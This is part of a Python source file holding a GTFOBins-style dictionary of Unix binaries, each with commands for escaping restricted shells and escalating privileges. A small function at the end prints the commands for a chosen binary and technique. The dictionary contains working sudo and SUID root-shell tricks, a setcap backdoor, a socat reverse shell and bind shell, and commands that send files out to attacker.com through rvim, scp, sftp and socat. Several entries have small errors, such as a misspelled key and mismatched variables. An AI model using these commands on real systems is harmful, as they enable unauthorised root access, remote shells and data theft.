                '1':"export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'"}},
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"rvim file_to_write\niDATA\n^[\nw"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"rvim file_to_read"}}, 
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rvim) .\n\n./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                '2':"sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"}},
        'capabilities':{   
            'info':'If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.',
            'exploits':{
                '1':"cp $(which rvim) .\nsudo setcap cap_setuid+ep rvim\n\n./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rvim) ."}}, 
            },
    'scp':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:"}}, 
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH'"}},  
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which scp) .\n\nTF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:"}},    
            },
    'screen':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"screen"}}, 
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo screen"}},  
            },
    'script':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"script -q /dev/null"}}, 
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"script -q -c 'echo DATA' file_to_write"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo script -q /dev/null"}},  
            },
    'sed':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"sed -n '1e exec sh 1>&0' /etc/hosts",
                '2':"sed e"}}, 
        'command':{   
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"sed -n '1e id' /etc/hosts"}}, 
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts"}},  
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nsed '' \"$LFILE\""}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which sed) .\n\nLFILE=file_to_read\n./sed -e '' \"$LFILE\""}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo sed -n '1e exec sh 1>&0' /etc/hosts"}},  
            },
    'service':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"/usr/sbin/service ../../bin/sh"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo service ../../bin/sh"}},  
            },
    'setarch':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"setarch $(arch) /bin/sh"}}, 
        'suid':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"sudo install -m =xs $(which setarch) .\n\n./setarch $(arch) /bin/sh -p"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo setarch $(arch) /bin/sh"}},  
            },
    'stfp':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"HOST=user@attacker.com\nsftp $HOST\n!/bin/sh"}}, 
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save"}}, 
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"RHOST=user@attacker.com\nsudo sftp $RHOST\n!/bin/sh"}},  
            },
    'sg':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"sg $(id -ng)"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo sg root"}},  
            },
    'shuf':{
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\""}}, 
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nshuf -z \"$LFILE\""}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which shuf) .\n\nLFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\""}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\""}},  
            },
    'slsh':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"slsh -e 'system(\"/bin/sh\")'"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo slsh -e 'system(\"/bin/sh\")'"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which slsh) .\n\n./slsh -e 'system(\"/bin/sh\")'"}},  
            },
    'smbclient':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"smbclient '\\attacker\share'\n!/bin/sh"}}, 
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"smbclient '\\attacker\share' -c 'put file_to_send where_to_save'"}}, 
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"smbclient '\\attacker\share' -c 'put file_to_send where_to_save'"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo smbclient '\\attacker\share'\n!/bin/sh"}},  
            },
    'snap':{
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"COMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\n\nsudo snap install xxxx_1.0_all.snap --dangerous --devmode"}},  
            },
    'socat':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"socat stdin exec:/bin/sh"}}, 
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"}}, 
        'bind_shell':{   
            'info':'It can bind a shell to a local port to allow remote network access.',
            'exploits':{
                '1':"LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"}}, 
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT"}}, 
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo socat stdin exec:/bin/sh"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which socat) .\n\nRHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"}},  
            },
    'soelim':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nsoelim \"$LFILE\""}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which soelim) .\n\nLFILE=file_to_read\n./soelim \"$LFILE\""}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo soelim \"$LFILE\""}},  
            },
    'sort':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nsort -m \"$LFILE\""}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which sort) .\n\nLFILE=file_to_read\n./sort -m \"$LFILE\""}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo sort -m \"$LFILE\""}},  
            },
    'split':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"split --filter=/bin/sh /dev/stdin"}}, 
        'command':{   
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"COMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF",
                '2':"COMMAND=id\necho | split --filter=$COMMAND /dev/stdin"}}, 
        'file_write':{   
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"TF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF",
                '2':"EXT=.xxx\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m --additional-suffix $EXTENSION $TF"}}, 
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo split --filter=/bin/sh /dev/stdin"}},  
            },
    'sqlite3':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"sqlite3 /dev/null '.shell /bin/sh'"}}, 
        'file_write':{   
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'"}}, 
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"}}, 
        'suid':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"sudo install -m =xs $(which sqlite3) .\n\nLFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo sqlite3 /dev/null '.shell /bin/sh'"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which sqlite3) .\n\n./sqlite3 /dev/null '.shell /bin/sh'"}},  
            },
    'ss':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nss -a -F $LFILE"}}, 
        'suid':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"sudo install -m =xs $(which ss) .\n\nLFILE=file_to_read\n./ss -a -F $LFILE"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo ss -a -F $LFILE"}},   
            },
    'ssh-keygen':{
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"ssh-keygen -D ./lib.so"}}, 
        'suid':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"sudo install -m =xs $(which ssh-keygen) .\n\n./ssh-keygen -D ./lib.so"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ssh-keygen -D ./lib.so"}},   
            },
    'ssh-keyscan':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nssh-keyscan -f $LFILE"}}, 
        'suid':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"sudo install -m =xs $(which ssh-keyscan) .\n\nLFILE=file_to_read\n./ssh-keyscan -f $LFILE"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE"}},   
            },
    'zathura':{
            'shell':{
                'info':'It can be used to break out from restricted environments by spawning an interactive system shell.'
                }
            },
}
ORANGE = '\033[0;38;5;214m\002'

END = '\001\033[0m\002'
def gtfo_bin(priv, exploit):
    print(f'[+] Privilege: {priv}')
    for exploit in binaries[priv][exploit]['exploits'].values():
        expl = exploit.replace("\n", "\\n")
        print(f'{ORANGE}{expl}{END}')

